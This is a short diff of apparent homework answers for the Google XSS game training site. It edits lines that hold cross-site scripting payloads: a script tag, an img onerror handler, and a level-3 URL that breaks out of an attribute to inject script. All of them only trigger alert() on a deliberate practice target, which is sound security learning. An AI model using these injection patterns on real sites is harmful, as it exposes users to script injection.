@@ -16,9 +16,9 @@ Website never worked?
 
 ### Part 2 (60 Pts)
 
-1) Input: <script>alert()</script>
+1) Input:<script>alert()</script>
 
-2) Input: <img src = "foo" onerror=alert();>
+2) Input:<img src = "foo" onerror=alert();>
 
 3) Full URL: https://xss-game.appspot.com/level3/frame#1+".jpg'/> <img src ='foo' onerror=alert();>
 
